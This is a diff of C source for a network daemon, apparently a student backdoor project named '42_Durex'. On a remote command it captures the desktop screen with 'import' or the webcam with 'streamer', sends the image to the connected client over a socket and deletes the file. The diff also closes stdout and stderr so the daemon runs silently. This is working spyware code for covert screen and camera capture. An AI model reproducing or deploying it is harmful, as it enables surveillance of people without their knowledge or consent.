@@ -154,30 +154,11 @@ static void	screen(t_users *users, char **envp, uint8_t flag)
 {
 	#define IMG_PATH "/tmp/screen.jpeg"
 	pid_t	pid = 0;
-	// mplayer -vo png -frames 1 tv://
 	char	*exec_screen[] = {"/usr/bin/import", "-window", "root", IMG_PATH, NULL};
-	/*char	*exec_screen[] = {"/usr/bin/scrot", "/tmp/screen.jpeg", NULL};*/
 	char	*exec_cam[] = {"/usr/bin/streamer", "-f", "jpeg", "-s", "1920x1080", "-o", IMG_PATH, NULL};
-	/*streamer -f jpeg -s 1024x768 -o image.jpeg*/
 	char *env[] = {"DISPLAY=:0",
 					"HOME=/home/segfault42",
-					"LOGNAME=segfault42",
-					"SHLVL=1",
-					"PWD=/home/segfault42/Documents/42_Durex",
-					"OLDPWD=/home/segfault42/Documents/42_Durex",
-					"ZSH=/home/rabougue/.oh-my-zsh",
-					"PAGER=less",
-					"LESS=-R",
-					"LC_CTYPE=",
-					"LSCOLORS=Gxfxcxdxbxegedabagacad",
-					"LS_COLORS=",
-					"PROMPT_START_TAG=SegFault42 -> ",
-					"PROMPT_END_TAG= <- $",
-					"PROMPT_START_TAG_COLOR=172",
-					"PROMPT_END_TAG_COLOR=172",
-					"PATH=/home/rabougue/bin:/home/rabougue/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/home/rabougue/.antigen/bundles/robbyrussell/oh-my-zsh/plugins/heroku:/home/rabougue/.vimpkg/bin",
-					"_=/usr/bin/env",
-					""};
+					NULL};
 	int		status;
 	ssize_t	ret_read = 0;
 	char	buff[BUFFSIZE] = {0};
@@ -191,17 +172,13 @@ static void	screen(t_users *users, char **envp, uint8_t flag)
 	{
 		if (flag == SCREEN)
 		{
-			/*system("/usr/bin/import -window root /tmp/screen.jpeg");*/
-			dprintf(1, "%s %s %s %s\n", exec_screen[0], exec_screen[1], exec_screen[2], exec_screen[3]);
 			if (execve(exec_screen[0], exec_screen, env) == -1)
 				perror("execv");
-				/*printf("error scrren\n");*/
 		}
 		else if (flag == CAM)
 		{
 			if (execve(exec_cam[0], exec_cam, envp) == -1)
 				perror("execv");
-				/*printf("error cam\n");*/
 		}
 	}
 	else
@@ -211,29 +188,22 @@ static void	screen(t_users *users, char **envp, uint8_t flag)
 	}
 
 	struct stat	st;
-	/*if (flag == SCREEN)*/
 	fd = open(IMG_PATH, O_RDONLY);
 	if (fd == -1)
 	{
 		send(users->sd, "Screen failed !", strlen("screen failed !"), 0);
 		return ;
 	}
-	/*else*/
-	/*fd = open("/tmp/cam.jpeg", O_RDONLY);*/
 	if (fd)
 	{
 		fstat(fd, &st);
 		char	size[7] = {0};
 		sprintf(size, "%lu", st.st_size);
-		printf("%lu", st.st_size);
 		send(users->sd, &size, strlen(size), 0);
 		while ((ret_read = read(fd, &buff, BUFFSIZE)) > 0)
 			send(users->sd, &buff, ret_read, 0);
 	}
-	/*if (flag == SCREEN)*/
 	remove(IMG_PATH);
-	/*else*/
-	/*remove("/tmp/cam.jpeg");*/
 
 }
 
@@ -252,8 +222,8 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 	memset(&users, 0, sizeof(users));
 
 	/*close(0);*/
-	/*close(1);*/
-	/*close(2);*/
+	close(1);
+	close(2);
 	signal(SIGPIPE, signal_handler);
 	if (listen(connexion->master_socket, 3) < 0)
 	{
